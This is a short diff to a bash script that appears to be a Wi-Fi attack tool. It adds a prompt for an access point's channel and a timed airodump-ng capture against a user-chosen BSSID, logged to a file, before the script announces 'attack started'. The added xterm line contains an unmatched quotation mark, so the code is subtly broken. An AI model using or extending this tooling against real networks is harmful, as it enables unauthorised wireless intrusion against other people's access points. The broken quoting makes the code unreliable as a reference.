@@ -373,6 +373,19 @@ echo -e  '\e[1;31m '
 read -p  'bssid : ' bssidda
 echo
 echo
+echo
+echo
+echo   channel of acces point
+echo
+echo
+echo
+read -p 'channel : ' chanelda
+echo
+echo
+n_secondes=7
+( xterm -title wait... -e airodump-ng --bssid $bssidda -c $chanelda $interfaceda >> lewifi1234.txt") &
+sleep 7
+kill $!
 clear
 echo -e  '\e[1;32m '
 echo attack started ... 
